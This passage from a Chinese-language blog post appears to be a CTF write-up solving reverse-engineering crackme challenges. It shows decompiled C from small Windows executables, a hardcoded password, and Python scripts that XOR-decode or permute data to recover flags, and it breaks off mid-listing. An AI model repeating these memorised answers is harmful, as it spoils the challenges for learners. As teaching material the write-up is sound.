Windows</span><br></pre></td></tr></table></figure><p>main 函数看到有一个密码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">char</span> password; <span class="comment">// [esp+10h] [ebp-104h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+11h] [ebp-103h]</span></span><br><span class="line"></span><br><span class="line">  password = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please input ns-ctf password: "</span>);</span><br><span class="line">  scanf_s(<span class="string">"%s"</span>, &amp;password);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; <span class="built_in">strncmp</span>(<span class="string">"nsF0cuS!x01"</span>, &amp;password, <span class="number">0xB</span>u); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"try again!\n"</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;password, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input ns-ctf password: "</span>);</span><br><span class="line">    scanf_s(<span class="string">"%s"</span>, &amp;password);</span><br><span class="line">  &#125;</span><br><span class="line">  dword_403368 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( &amp;password + <span class="built_in">strlen</span>(&amp;password) + <span class="number">1</span> != &amp;Dst )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      func();</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag:&#123;NSCTF_md5065ca&gt;01??ab7e0f4&gt;&gt;a701c&gt;cd17340&#125;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现和前一题一模一样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> Format; <span class="comment">// [esp+0h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+1h] [ebp-37h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+Fh] [ebp-29h]</span></span><br><span class="line"></span><br><span class="line">  Format = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  strncpy_s(&amp;Format, <span class="number">0x31</span>u, <span class="string">"flag:&#123;NSCTF_md5065ca&gt;01??ab7e0f4&gt;&gt;a701c&gt;cd17340&#125;"</span>, <span class="number">0x30</span>u);</span><br><span class="line">  v0 = &amp;v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 != <span class="number">125</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *v0 ^= <span class="number">7u</span>;</span><br><span class="line">      ++v0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( *v0 != <span class="number">125</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;Format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>异或一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">enc = <span class="string">'065ca&gt;01??ab7e0f4&gt;&gt;a701c&gt;cd17340'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">flag += chr(ord(enc[i]) ^ <span class="number">7</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file 5.exe</span><br><span class="line">5.exe: PE32 executable (console) Intel 80386, for MS Windows</span><br></pre></td></tr></table></figure><p>用 OD 搜索字符串，定位关键函数：</p><p><img src="/pics/杭电CTF-题库-reverse/4.png" alt="关键函数"></p><p>在 IDA 里找到函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">sub_401000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">20</span>]; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">19</span>; ++i )</span><br><span class="line">    v1[i] = off_409030[<span class="number">47</span> * i % <span class="number">100</span>];</span><br><span class="line">  sub_401129((<span class="keyword">int</span>)&amp;unk_4092CC, i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正向实现一下就行了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">table = [<span class="number">0x28</span>, <span class="number">0x2A</span>, <span class="number">0x26</span>, <span class="number">0x54</span>, <span class="number">0x49</span>, <span class="number">0x4F</span>, <span class="number">0x75</span>, <span class="number">0x68</span>, <span class="number">0x33</span>, <span class="number">0x6C</span>, <span class="number">0x31</span>, <span class="number">0x6A</span>, <span class="number">0x34</span>, <span class="number">0x68</span>, <span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x76</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x28</span>, <span class="number">0x26</span>, <span class="number">0x25</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x62</span>, <span class="number">0x76</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0x6B</span>, <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x5E</span>, <span class="number">0x26</span>, <span class="number">0x25</span>, <span class="number">0x2A</span>, <span class="number">0x26</span>, <span class="number">0x5E</span>, <span class="number">0x52</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x6A</span>, <span class="number">0x33</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x64</span>, <span class="number">0x68</span>, <span class="number">0x63</span>, <span class="number">0x66</span>, <span class="number">0x39</span>, <span class="number">0x48</span>, <span class="number">0x43</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x48</span>, <span class="number">0x56</span>, <span class="number">0x28</span>, <span class="number">0x2A</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x44</span>, <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x62</span>, <span class="number">0x6F</span>, <span class="number">0x71</span>, <span class="number">0x69</span>, <span class="number">0x77</span>, <span class="number">0x75</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x32</span>, <span class="number">0x71</span>, <span class="number">0x33</span>, <span class="number">0x37</span>, <span class="number">0x78</span>, <span class="number">0x63</span>, <span class="number">0x76</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x68</span>, <span class="number">0x71</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x66</span>, <span class="number">0x6A</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x63</span>, <span class="number">0x6A</span>, <span class="number">0x76</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x48</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x6E</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x6A</span>, <span class="number">0x68</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6B</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x6E</span>, <span class="number">0x49</span>, <span class="number">0x4F</span>, <span class="number">0x2A</span>, <span class="number">0x26</span>, <span class="number">0x59</span>, <span class="number">0x4F</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x4E</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x69</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x76</span>, <span class="number">0x38</span>, <span class="number">0x30</span>, <span class="number">0x37</span>, <span class="number">0x39</span>, <span class="number">0x68</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x42</span>, <span class="number">0x4F</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x36</span>, <span class="number">0x74</span>, <span class="number">0x66</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x70</span>, <span class="number">0x30</span>, <span class="number">0x34</span>, <span class="number">0x2D</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x75</span>, <span class="number">0x6A</span>, <span class="number">0x6C</span>, <span class="number">0x76</span>, <span class="number">0x3B</span>, <span class="number">0x6B</span>, <span class="number">0x6E</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x59</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x68</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x34</span>, <span class="number">0x72</span>, <span class="number">0x6E</span>, <span class="number">0x5B</span>, <span class="number">0x70</span>, <span class="number">0x39</span>, <span class="number">0x75</span>, <span class="number">0x64</span>, <span class="number">0x76</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x6D</span>, <span class="number">0x31</span>, <span class="number">0x70</span>, <span class="number">0x39</span>, <span class="number">0x79</span>, <span class="number">0x68</span>, <span class="number">0x38</span>, <span class="number">0x55</span>, <span class="number">0x47</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x68</span>, <span class="number">0x70</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x52</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x2A</span>, <span class="number">0x26</span>, <span class="number">0x5E</span>, <span class="number">0x52</span>, <span class="number">0x46</span>, <span class="number">0x43</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x4E</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x45</span>, <span class="number">0x57</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x33</span>, <span class="number">0x6F</span>, <span class="number">0x34</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x76</span>, <span class="number">0x63</span>, <span class="number">0x33</span>, <span class="number">0x6F</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x37</span>, <span class="number">0x34</span>, <span class="number">0x39</span>, <span class="number">0x26</span>, <span class="number">0x2A</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x7A</span>, <span class="number">0x78</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0x26</span>, <span class="number">0x2A</span>, <span class="number">0x26</span>, <span class="number">0x74</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x34</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x76</span>, <span class="number">0x7A</span>, <span class="number">0x78</span>, <span class="number">0x63</span>, <span class="number">0x43</span>, <span class="number">0x4C</span>, <span class="number">0x49</span>, <span class="number">0x4B</span>, <span class="number">0x4B</span>, <span class="number">0x48</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x64</span>, <span class="number">0x75</span>, <span class="number">0x79</span>, <span class="number">0x66</span>, <span class="number">0x69</span>, <span class="number">0x32</span>, <span class="number">0x77</span>, <span class="number">0x6A</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x70</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x63</span>, <span class="number">0x70</span>, <span class="number">0x69</span>, <span class="number">0x6B</span>, <span class="number">0x76</span>, <span class="number">0x70</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x75</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x2D</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x38</span>, <span class="number">0x75</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x6B</span>, <span class="number">0x6E</span>, <span class="number">0x76</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>, <span class="number">0x64</span>, <span class="number">0x6B</span>, <span class="number">0x73</span>, <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x76</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x79</span>, <span class="number">0x39</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x68</span>, <span class="number">0x6E</span>, <span class="number">0x30</span>, <span class="number">0x34</span>, <span class="number">0x38</span>, <span class="number">0x79</span>, <span class="number">0x66</span>, <span class="number">0x70</span>, <span class="number">0x4F</span>, <span class="number">0x49</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x38</span>, <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x34</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x35</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x6F</span>, <span class="number">0x78</span>, <span class="number">0x66</span>, <span class="number">0x63</span>, <span class="number">0x68</span>, <span class="number">0x76</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x6E</span>, <span class="number">0x68</span>, <span class="number">0x30</span>, <span class="number">0x28</span>, <span class="number">0x2A</span>, <span class="number">0x59</span>, <span class="number">0x6F</span>, <span class="number">0x70</span>, <span class="number">0x69</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x6E</span>, <span class="number">0x74</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x75</span>, <span class="number">0x38</span>, <span class="number">0x32</span>, <span class="number">0x68</span>, <span class="number">0x67</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x6E</span>, <span class="number">0x63</span>, <span class="number">0x76</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x59</span>, <span class="number">0x70</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x70</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x68</span>, <span class="number">0x39</span>, <span class="number">0x65</span>, <span class="number">0x77</span>, <span class="number">0x75</span>, <span class="number">0x69</span>, <span class="number">0x68</span>, <span class="number">0x6E</span>, <span class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x4A</span>, <span class="number">0x53</span>, <span class="number">0x41</span>, <span class="number">0x4F</span>, <span class="number">0x49</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x75</span>, <span class="number">0x79</span>, <span class="number">0x68</span>, <span class="number">0x34</span>, <span class="number">0x75</span>, <span class="number">0x6E</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x3B</span>, <span class="number">0x66</span>, <span class="number">0x6B</span>, <span class="number">0x76</span>, <span class="number">0x62</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>, <span class="number">0x76</span>, <span class="number">0x6E</span>, <span class="number">0x70</span>, <span class="number">0x49</span>, <span class="number">0x2A</span>, <span class="number">0x59</span>, <span class="number">0x4F</span>, <span class="number">0x49</span>, <span class="number">0x45</span>, <span class="number">0x6E</span>, <span class="number">0x72</span>, <span class="number">0x70</span>, <span class="number">0x32</span>, <span class="number">0x6F</span>, <span class="number">0x33</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x66</span>, <span class="number">0x39</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x78</span>, <span class="number">0x64</span>, <span class="number">0x63</span>, <span class="number">0x70</span>, <span class="number">0x4C</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x4A</span>, <span class="number">0x2D</span>, <span class="number">0x39</span>, <span class="number">0x38</span>, <span class="number">0x66</span>, <span class="number">0x79</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x6B</span>, <span class="number">0x6E</span>, <span class="number">0x66</span>, <span class="number">0x70</span>, <span class="number">0x6F</span>, <span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x69</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x2D</span>, <span class="number">0x33</span>, <span class="number">0x39</span>, <span class="number">0x6A</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x6B</span>, <span class="number">0x31</span>, <span class="number">0x68</span>, <span class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x75</span>, <span class="number">0x6A</span>, <span class="number">0x66</span>, <span class="number">0x64</span>, <span class="number">0x76</span>, <span class="number">0x6D</span>, <span class="number">0x6B</span>, <span class="number">0x70</span>, <span class="number">0x49</span>, <span class="number">0x75</span>, <span class="number">0x64</span>, <span class="number">0x31</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x65</span>, <span class="number">0x2D</span>, <span class="number">0x66</span>, <span class="number">0x39</span>, <span class="number">0x32</span>, <span class="number">0x4C</span>, <span class="number">0x4F</span>, <span class="number">0x49</span>, <span class="number">0x58</span>, <span class="number">0x4A</span>, <span class="number">0x48</span>, <span class="number">0x43</span>, <span class="number">0x28</span>, <span class="number">0x49</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x6D</span>, <span class="number">0x70</span>, <span class="number">0x77</span>, <span class="number">0x71</span>, <span class="number">0x6B</span>, <span class="number">0x66</span>, <span class="number">0x6E</span>, <span class="number">0x70</span>, <span class="number">0x39</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x75</span>, <span class="number">0x66</span>, <span class="number">0x2D</span>, <span class="number">0x30</span>, <span class="number">0x65</span>, <span class="number">0x69</span>, <span class="number">0x6B</span>, <span class="number">0x66</span>, <span class="number">0x31</span>, <span class="number">0x70</span>, <span class="number">0x33</span>, <span class="number">0x69</span>, <span class="number">0x6F</span>, <span class="number">0x34</span>, <span class="number">0x66</span>, <span class="number">0x6A</span>, <span class="number">0x2D</span>, <span class="number">0x39</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x76</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x77</span>, <span class="number">0x71</span>, <span class="number">0x6E</span>, <span class="number">0x66</span>, <span class="number">0x64</span>, <span class="number">0x70</span>, <span class="number">0x76</span>, <span class="number">0x69</span>, <span class="number">0x4A</span>, <span class="number">0x4F</span>, <span class="number">0x53</span>, <span class="number">0x44</span>, <span class="number">0x6A</span>, <span class="number">0x66</span>, <span class="number">0x70</span>, <span class="number">0x32</span>, <span class="number">0x6F</span>, <span class="number">0x69</span>, <span class="number">0x33</span>, <span class="number">0x72</span>, <span class="number">0x6A</span>, <span class="number">0x66</span>, <span class="number">0x2D</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x6A</span>, <span class="number">0x76</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x31</span>, <span class="number">0x33</span>, <span class="number">0x6D</span>, <span class="number">0x66</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x2D</span>, <span class="number">0x31</span>, <span class="number">0x33</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x34</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x71</span>, <span class="number">0x77</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x31</span>, <span class="number">0x70</span>, <span class="number">0x5B</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x30</span>, <span class="number">0x39</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x63</span>, <span class="number">0x66</span>, <span class="number">0x6D</span>, <span class="number">0x76</span>, <span class="number">0x00</span>]</span><br><span class="line">v3 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">19</span>):</span><br><span class="line">v3 += chr(table[<span class="number">47</span> * i % <span class="number">100</span>])</span><br><span class="line"><span class="keyword">print</span> v3</span><br></pre></td></tr></table></figure><h1 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file 6.exe</span><br><span class="line">6.exe: PE32 executable (console) Intel 80386, for MS Windows</span><br></pre></td></tr></table></figure><p>在 IDA 里硬逆就完事了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span 